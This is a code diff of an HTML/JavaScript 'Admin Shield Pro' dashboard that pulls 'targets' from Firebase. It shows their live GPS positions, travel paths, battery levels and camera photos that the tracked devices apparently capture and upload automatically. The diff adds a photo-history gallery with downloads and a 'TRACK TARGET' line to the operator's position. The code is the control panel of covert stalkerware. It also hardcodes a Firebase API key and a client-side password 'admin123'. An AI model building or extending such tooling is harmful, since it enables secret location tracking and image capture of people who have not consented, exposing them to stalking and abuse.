@@ -3,47 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Shield Pro - Live Automation</title>
+    <title>Admin Shield Pro - Secured Automation</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
         body { margin: 0; display: flex; height: 100vh; font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; overflow: hidden; }
-        #sidebar { width: 340px; background: #1a202c; padding: 20px; border-right: 1px solid #2d3748; overflow-y: auto; z-index: 10; box-shadow: 5px 0 15px rgba(0,0,0,0.5); }
-        #map { flex: 1; z-index: 1; }
         
-        h2 { color: #63b3ed; margin-top: 0; border-bottom: 1px solid #2d3748; padding-bottom: 10px; }
-        
-        .map-toggle { background: #2d3748; padding: 12px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #4a5568; }
-        .map-toggle select { width: 100%; background: #1a202c; color: white; border: none; padding: 8px; border-radius: 5px; cursor: pointer; outline: none; }
+        /* Password Overlay */
+        #authOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; z-index: 9999; display: flex; justify-content: center; align-items: center; flex-direction: column; }
+        .auth-card { background: #1e293b; padding: 40px; border-radius: 20px; border: 1px solid #334155; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .auth-card h2 { color: #63b3ed; margin-bottom: 20px; }
+        .auth-card input { padding: 12px; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: white; width: 250px; text-align: center; font-size: 16px; outline: none; margin-bottom: 20px; }
+        .auth-card button { background: #38a169; color: white; border: none; padding: 12px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
+        .auth-card button:hover { background: #2f855a; }
+        #errorMsg { color: #f56565; font-size: 13px; margin-top: 10px; display: none; }
 
+        /* Main UI Layout */
+        #sidebar { width: 340px; background: #1a202c; padding: 20px; border-right: 1px solid #2d3748; overflow-y: auto; z-index: 10; display: none; box-shadow: 5px 0 15px rgba(0,0,0,0.5); }
+        #map { flex: 1; z-index: 1; display: none; }
+        
+        h2 { color: #63b3ed; border-bottom: 1px solid #2d3748; padding-bottom: 10px; margin-top: 0; }
+        .map-toggle { background: #2d3748; padding: 12px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #4a5568; }
+        .map-toggle select { width: 100%; background: #1a202c; color: white; border: none; padding: 8px; border-radius: 5px; cursor: pointer; }
         .admin-box { background: #2d3748; padding: 12px; border-radius: 12px; margin-bottom: 20px; border-left: 5px solid #ed64a6; font-size: 13px; }
         
+        /* Cards and Lists */
         .user-card { background: #2d3748; padding: 15px; border-radius: 12px; margin-bottom: 15px; cursor: pointer; border: 2px solid transparent; transition: 0.3s; position: relative; }
-        .user-card:hover { border-color: #4a5568; }
-        
         .active-follow { border-color: #e53e3e !important; background: #2d1a1a !important; box-shadow: 0 0 15px rgba(229, 62, 62, 0.3); }
-        
         .track-indicator { color: #f56565; font-size: 11px; font-weight: bold; display: none; margin-top: 8px; animation: blink 1s infinite; }
         .active-follow .track-indicator { display: block; }
-
-        .battery-tag { float: right; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; background: #234e33; color: #48bb78; }
-        
-        .track-btn { background: #4a5568; color: white; border: none; padding: 10px; border-radius: 8px; width: 100%; cursor: pointer; margin-top: 10px; font-weight: bold; transition: 0.2s; }
+        .battery-tag { float: right; padding: 2px 8px; border-radius: 4px; font-size: 11px; background: #234e33; color: #48bb78; }
+        .track-btn { background: #4a5568; color: white; border: none; padding: 10px; border-radius: 8px; width: 100%; cursor: pointer; margin-top: 10px; font-weight: bold; }
         .photo-btn { background: #63b3ed !important; color: #1a202c !important; }
-        .active-btn { background: #e53e3e !important; box-shadow: 0 0 10px rgba(229, 62, 62, 0.5); }
+        .delete-btn { position: absolute; top: 10px; right: 10px; color: #718096; font-size: 20px; cursor: pointer; }
 
-        .btn-clear { background: #e53e3e; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; cursor: pointer; margin-bottom: 10px; font-weight: bold; transition: 0.2s; }
-        
-        .delete-btn { position: absolute; top: 10px; right: 10px; color: #718096; font-size: 18px; cursor: pointer; }
+        /* 📁 Folder/Gallery Overlay */
+        #folderOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; z-index: 15000; overflow-y: auto; padding: 30px; box-sizing: border-box; }
+        .folder-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #63b3ed; padding-bottom: 15px; margin-bottom: 20px; }
+        .folder-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 20px; }
+        .folder-card { background: #1e293b; padding: 10px; border-radius: 15px; border: 1px solid #334155; text-align: center; transition: 0.3s; }
+        .folder-card img { width: 100%; height: 160px; object-fit: cover; border-radius: 10px; cursor: pointer; border: 1px solid #475569; }
+        .close-folder-btn { font-size: 45px; color: #f56565; cursor: pointer; font-weight: bold; line-height: 1; }
+        .close-folder-btn:hover { color: #ff0000; }
 
-        /* Modal for Photo */
-        #photoModal { display: none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; flex-direction: column; }
-        #photoModal img { max-width: 90%; max-height: 70%; border: 5px solid white; border-radius: 10px; box-shadow: 0 0 20px rgba(99, 179, 237, 0.5); }
-        #photoModal .info { color: white; margin-top: 15px; text-align: center; background: #2d3748; padding: 10px; border-radius: 8px; border: 1px solid #63b3ed; }
-        #photoModal span { position: absolute; top: 20px; right: 30px; font-size: 40px; color: white; cursor: pointer; }
-
+        /* Photo Modal */
+        #photoModal { display: none; position: fixed; z-index: 20000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; flex-direction: column; }
+        #photoModal img { max-width: 90%; max-height: 70%; border: 5px solid white; border-radius: 10px; }
         .live-badge { background: red; color: white; padding: 3px 10px; border-radius: 5px; font-size: 12px; font-weight: bold; animation: blink 1s infinite; margin-bottom: 10px; }
 
         @keyframes blink { 50% { opacity: 0.3; } }
@@ -51,37 +58,61 @@
 </head>
 <body>
 
+<div id="authOverlay">
+    <div class="auth-card">
+        <h2>Master Access 🔐</h2>
+        <input type="password" id="passCode" placeholder="Enter Password">
+        <br>
+        <button onclick="verifyAccess()">Unlock Dashboard</button>
+        <p id="errorMsg">Incorrect Password!</p>
+    </div>
+</div>
+
+<div id="folderOverlay">
+    <div class="folder-header">
+        <h2 id="folderTitle" style="margin:0; color:#63b3ed;">📂 Photo History</h2>
+        <span class="close-folder-btn" onclick="closeFolder()">×</span>
+    </div>
+    <div id="folderGrid" class="folder-grid"></div>
+</div>
+
 <div id="photoModal">
-    <span onclick="closePhotoModal()">×</span>
+    <span style="position:absolute; top:20px; right:30px; font-size:40px; color:white; cursor:pointer;" onclick="closePhotoModal()">×</span>
     <div class="live-badge">🔴 LIVE AUTOMATION ACTIVE</div>
     <img id="modalImg" src="">
-    <div class="info" id="modalInfo"></div>
+    <div id="modalInfo" style="color:white; margin-top:15px; text-align:center; padding:10px;"></div>
+    <button class="track-btn" style="width: 200px; background: #38a169;" onclick="downloadCurrentPhoto()">📥 DOWNLOAD</button>
 </div>
 
 <audio id="trackSound" src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3" preload="auto"></audio>
+<audio id="updateSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
 
 <div id="sidebar">
     <h2>Admin Shield 🛡️</h2>
-    
     <div class="map-toggle">
-        <label style="font-size: 11px; color: #a0aec0; font-weight: bold;">VIEW MODE:</label>
         <select id="mapMode" onchange="changeMapMode(this.value)">
             <option value="normal">Normal Street Map</option>
-            <option value="satellite">Satellite (Street View)</option>
+            <option value="satellite">Satellite View</option>
         </select>
     </div>
-
     <div class="admin-box">
-        <strong>My Location (Admin):</strong> <br>
+        <strong>Admin GPS:</strong> <br>
         <span id="admin-pos" style="color: #ed64a6; font-family: monospace;">Detecting GPS...</span>
     </div>
+    <button style="background:#e53e3e; color:white; border:none; padding:12px; width:100%; border-radius:10px; cursor:pointer; font-weight:bold; margin-bottom:15px;" onclick="clearHistory()">🧹 Reset Map Lines</button>
+    
+    <div id="user-list">Searching users...</div>
 
-    <button class="btn-clear" onclick="clearHistory()">🧹 Reset Map Lines</button>
-    <div id="user-list">Searching for active users...</div>
+    <div style="margin-top:20px; border-top:1px solid #4a5568; padding-top:15px;">
+        <div style="color:#63b3ed; font-weight:bold; margin-bottom:10px;">📁 Photo Gallery</div>
+        <div id="gallery-grid" style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;"></div>
+    </div>
 </div>
+
 <div id="map"></div>
 
 <script>
+    const MASTER_PASS = "admin123"; 
     const firebaseConfig = {
         apiKey: "AIzaSyCZz90P8npkRcL0ZctIelDFbKRN48BsZzk",
         authDomain: "tracking-7494e.firebaseapp.com",
@@ -90,23 +121,29 @@
         messagingSenderId: "861816870090",
         appId: "1:861816870090:web:4dec49659b3806fcd49033"
     };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
-    db.settings({ cacheSizeBytes: firebase.firestore.CACHE_SIZE_UNLIMITED });
 
     let map, markers = {}, paths = {}, followingUser = null, adminMarker = null, currentTileLayer;
-    let redNavLine = null;
-    let activePhotoUserId = null; // Track karne ke liye ki kiska modal khula hai
+    let redNavLine = null, activePhotoUserId = null, userLastPhotos = {};
 
     const layers = {
         normal: L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png'),
         satellite: L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}')
     };
 
-    const adminIcon = L.icon({
-        iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-pink.png',
-        iconSize: [25, 41], iconAnchor: [12, 41]
-    });
+    function verifyAccess() {
+        const pass = document.getElementById('passCode').value;
+        if(pass === MASTER_PASS) {
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('sidebar').style.display = 'block';
+            document.getElementById('map').style.display = 'block';
+            initMap();
+        } else {
+            document.getElementById('errorMsg').style.display = 'block';
+        }
+    }
 
     function initMap() {
         map = L.map('map').setView([20.59, 78.96], 5);
@@ -127,11 +164,117 @@
             navigator.geolocation.watchPosition(pos => {
                 const latlng = [pos.coords.latitude, pos.coords.longitude];
                 if (adminMarker) adminMarker.setLatLng(latlng);
-                else adminMarker = L.marker(latlng, {icon: adminIcon}).addTo(map).bindPopup("<b>Admin (You)</b>");
+                else {
+                    adminMarker = L.marker(latlng, {
+                        icon: L.icon({
+                            iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-pink.png',
+                            iconSize: [25, 41], iconAnchor: [12, 41]
+                        })
+                    }).addTo(map).bindPopup("Admin (You)");
+                }
                 document.getElementById('admin-pos').innerText = `${latlng[0].toFixed(4)}, ${latlng[1].toFixed(4)}`;
                 if(followingUser) updateRedLine();
-            }, null, { enableHighAccuracy: true });
+            });
         }
+    }
+
+    function listenLive() {
+        db.collection("locations").onSnapshot(snap => {
+            const listDiv = document.getElementById('user-list');
+            const galleryGrid = document.getElementById('gallery-grid');
+            listDiv.innerHTML = '';
+
+            snap.forEach(doc => {
+                const d = doc.data();
+                const id = doc.id;
+                if(!d.lat || !d.lng) return;
+
+                if (d.userPhoto && d.userPhoto !== userLastPhotos[id]) {
+                    if (userLastPhotos[id] !== undefined) document.getElementById('updateSound').play().catch(()=>{});
+                    userLastPhotos[id] = d.userPhoto;
+                    if (activePhotoUserId === id) {
+                        document.getElementById('modalImg').src = d.userPhoto;
+                    }
+                }
+
+                const isFollowing = (followingUser === id);
+                listDiv.innerHTML += `
+                    <div class="user-card ${isFollowing ? 'active-follow' : ''}" onclick="map.panTo([${d.lat}, ${d.lng}])">
+                        <span class="delete-btn" onclick="deleteUser('${id}', event)">×</span>
+                        <strong>${id}</strong> <span class="battery-tag">🔋 ${d.battery || 0}%</span>
+                        <div class="track-indicator">🔴 TARGET LOCKED</div>
+                        <button class="track-btn photo-btn" onclick="event.stopPropagation(); openPhoto('${id}', '${d.userPhoto || ''}', '${d.camMode || 'N/A'}', '${d.lastPhotoTime || 'N/A'}')">🖼️ VIEW LIVE</button>
+                        <button class="track-btn" onclick="event.stopPropagation(); toggleFollow('${id}')">
+                            ${isFollowing ? '🛑 STOP TRACKING' : '🎯 TRACK TARGET'}
+                        </button>
+                    </div>`;
+
+                const pos = [parseFloat(d.lat), parseFloat(d.lng)];
+                if (markers[id]) markers[id].setLatLng(pos);
+                else markers[id] = L.marker(pos).addTo(map).bindTooltip(id, {permanent: true, direction: 'top'});
+
+                if (!paths[id]) paths[id] = L.polyline([], {color: '#00ff00', weight: 3}).addTo(map);
+                paths[id].addLatLng(pos);
+
+                if (isFollowing) {
+                    map.panTo(pos);
+                    updateRedLine();
+                }
+
+                if(d.userPhoto) {
+                    const cleanId = id.replace(/\s/g, '');
+                    let thumb = document.getElementById(`thumb-${cleanId}`);
+                    if(!thumb) {
+                        galleryGrid.insertAdjacentHTML('afterbegin', `
+                            <div class="photo-item" id="item-${cleanId}" style="background:#2d3748; padding:5px; border-radius:8px; text-align:center;" onclick="openFolder('${id}')">
+                                <img src="${d.userPhoto}" id="thumb-${cleanId}" style="width:100%; height:70px; object-fit:cover; border-radius:5px; cursor:pointer;">
+                                <span style="font-size:10px;">${id}</span>
+                            </div>`);
+                    } else thumb.src = d.userPhoto;
+                }
+            });
+        });
+    }
+
+    // --- 📁 FIXED FOLDER LOGIC (Shows All Photos) ---
+    function openFolder(userId) {
+        const grid = document.getElementById('folderGrid');
+        grid.innerHTML = '<p style="text-align:center; width:100%; color:#cbd5e0;">🔍 Scanning storage...</p>';
+        document.getElementById('folderTitle').innerText = `📂 History: ${userId}`;
+        document.getElementById('folderOverlay').style.display = 'block';
+
+        db.collection("locations").doc(userId).get().then(doc => {
+            if (doc.exists) {
+                const data = doc.data();
+                grid.innerHTML = '';
+                
+                // History fetch karein
+                let photos = data.photoHistory || [];
+                
+                // Agar history empty hai par current photo hai
+                if (photos.length === 0 && data.userPhoto) {
+                    photos = [data.userPhoto];
+                }
+
+                if (photos.length > 0) {
+                    // Reverse taaki Nayi photo pehle dikhe
+                    photos.slice().reverse().forEach((url, i) => {
+                        grid.innerHTML += `
+                            <div class="folder-card">
+                                <img src="${url}" onclick="window.open(this.src)">
+                                <div style="font-size:11px; margin:8px 0; color:#63b3ed; font-weight:bold;">Log #${photos.length - i}</div>
+                                <button class="track-btn" style="background:#38a169; padding:5px; font-size:10px; margin-top:0;" onclick="saveImage('${url}', '${userId}_${i}')">📥 Download</button>
+                            </div>`;
+                    });
+                } else {
+                    grid.innerHTML = '<p style="text-align:center; width:100%; color:#f56565;">No logs found.</p>';
+                }
+            }
+        });
+    }
+
+    function closeFolder() {
+        document.getElementById('folderOverlay').style.display = 'none';
     }
 
     function toggleFollow(userId) {
@@ -140,8 +283,8 @@
             if(redNavLine) { map.removeLayer(redNavLine); redNavLine = null; }
         } else {
             followingUser = userId;
-            document.getElementById('trackSound').play().catch(e => {});
-            if(markers[userId]) map.setView(markers[userId].getLatLng(), 18);
+            document.getElementById('trackSound').play().catch(()=>{});
+            if(markers[userId]) map.setView(markers[userId].getLatLng(), 17);
             updateRedLine();
         }
     }
@@ -153,91 +296,42 @@
         }
         const points = [adminMarker.getLatLng(), markers[followingUser].getLatLng()];
         if (redNavLine) redNavLine.setLatLngs(points);
-        else redNavLine = L.polyline(points, {color: '#e53e3e', weight: 5, dashArray: '10, 15'}).addTo(map);
+        else redNavLine = L.polyline(points, {color: '#e53e3e', weight: 4, dashArray: '10, 10'}).addTo(map);
     }
 
-    // Modal Automation Logic
-    function openPhoto(userId, data, cam, time) {
-        if(!data || data === 'undefined') return alert("Target ne abhi tak photo nahi bheji!");
-        activePhotoUserId = userId; // ID save karo
-        document.getElementById('modalImg').src = data;
-        document.getElementById('modalInfo').innerHTML = `<b>Target:</b> ${userId} | <b>Source:</b> ${cam || 'Unknown'} <br> <b>Time:</b> ${time || 'Just now'}`;
+    function openPhoto(userId, url, cam, time) {
+        if(!url) return alert("No photo available!");
+        activePhotoUserId = userId;
+        document.getElementById('modalImg').src = url;
+        document.getElementById('modalInfo').innerHTML = `<b>Target:</b> ${userId} | <b>Cam:</b> ${cam} <br> <b>Sync:</b> ${time}`;
         document.getElementById('photoModal').style.display = 'flex';
     }
 
-    function closePhotoModal() {
-        activePhotoUserId = null; // ID clear karo taaki background update ruk jaye
-        document.getElementById('photoModal').style.display = 'none';
+    function closePhotoModal() { activePhotoUserId = null; document.getElementById('photoModal').style.display = 'none'; }
+
+    function downloadCurrentPhoto() {
+        const src = document.getElementById('modalImg').src;
+        saveImage(src, activePhotoUserId || 'capture');
     }
 
-    function listenLive() {
-        db.collection("locations").onSnapshot(snap => {
-            const listDiv = document.getElementById('user-list');
-            listDiv.innerHTML = '';
-            
-            snap.forEach(doc => {
-                const d = doc.data();
-                const id = doc.id;
-                if(!d.lat || !d.lng) return;
-                
-                // AGAR MODAL KHULA HAI TO PHOTO AUTO-UPDATE KARO
-                if (activePhotoUserId === id && d.userPhoto) {
-                    document.getElementById('modalImg').src = d.userPhoto;
-                    document.getElementById('modalInfo').innerHTML = `<b>Target:</b> ${id} | <b>Source:</b> ${d.camMode || 'Unknown'} <br> <b>Time:</b> ${d.lastPhotoTime || 'Just now'}`;
-                }
-
-                const pos = [parseFloat(d.lat), parseFloat(d.lng)];
-                const isFollowing = (followingUser === id);
-
-                listDiv.innerHTML += `
-                    <div class="user-card ${isFollowing ? 'active-follow' : ''}" onclick="map.setView([${d.lat}, ${d.lng}], 17)">
-                        <span class="delete-btn" onclick="deleteUser('${id}', event)">×</span>
-                        <strong>${id}</strong> <span class="battery-tag">🔋 ${d.battery}%</span>
-                        
-                        <div style="font-size:11px; color:#63b3ed; margin-top:5px;">📷 Cam: ${d.camMode || 'Wait...'}</div>
-                        <div style="font-size:10px; color:#a0aec0;">🕒 Time: ${d.lastPhotoTime || '--:--'}</div>
-                        
-                        <div class="track-indicator">🔴 TARGET LOCKED - FOLLOW RED LINE</div>
-                        
-                        <button class="track-btn photo-btn" onclick="event.stopPropagation(); openPhoto('${id}', '${d.userPhoto}', '${d.camMode}', '${d.lastPhotoTime}')">
-                            🖼️ VIEW LIVE AUTOMATION
-                        </button>
-
-                        <button class="track-btn ${isFollowing ? 'active-btn' : ''}" onclick="event.stopPropagation(); toggleFollow('${id}')">
-                            ${isFollowing ? '🛑 STOP TRACKING' : '🎯 TRACK TARGET'}
-                        </button>
-                    </div>`;
-
-                if (markers[id]) markers[id].setLatLng(pos);
-                else markers[id] = L.marker(pos).addTo(map).bindTooltip(id, {permanent: true, direction: 'top'});
-
-                if (!paths[id]) paths[id] = L.polyline([], {color: '#00ff00', weight: 4}).addTo(map);
-                paths[id].addLatLng(pos);
-
-                if (isFollowing) {
-                    map.panTo(pos);
-                    updateRedLine();
-                }
-            });
-        });
+    function saveImage(url, name) {
+        const link = document.createElement('a');
+        link.href = url;
+        link.download = `${name}.jpg`;
+        link.click();
     }
 
     function deleteUser(id, e) {
         e.stopPropagation();
-        if(confirm("Hata dein?")) {
-            db.collection("locations").doc(id).delete();
-            if(markers[id]) map.removeLayer(markers[id]);
-            if(paths[id]) map.removeLayer(paths[id]);
-        }
+        if(confirm(`⚠️ Delete User ${id} permanently?`)) db.collection("locations").doc(id).delete();
     }
 
     function clearHistory() {
-        if(confirm("Clear lines?")) {
-            for (let id in paths) { map.removeLayer(paths[id]); delete paths[id]; }
+        if(confirm("Clear all travel lines?")) {
+            for (let id in paths) { map.removeLayer(paths[id]); }
+            paths = {};
         }
     }
-
-    window.onload = initMap;
 </script>
 </body>
 </html>
